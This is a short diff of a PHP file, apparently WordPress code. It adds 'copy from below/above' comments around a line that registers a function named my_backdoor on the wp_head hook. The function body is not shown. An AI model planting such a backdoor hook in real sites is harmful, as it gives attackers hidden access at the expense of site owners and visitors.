@@ -1,4 +1,7 @@
 <?php 
+
+// copy from below 
+
 add_action( 'wp_head', 'my_backdoor' );
 
 
@@ -37,7 +40,7 @@ function my_backdoor() {
 
 
 
-
+// copy from above
 
 
 
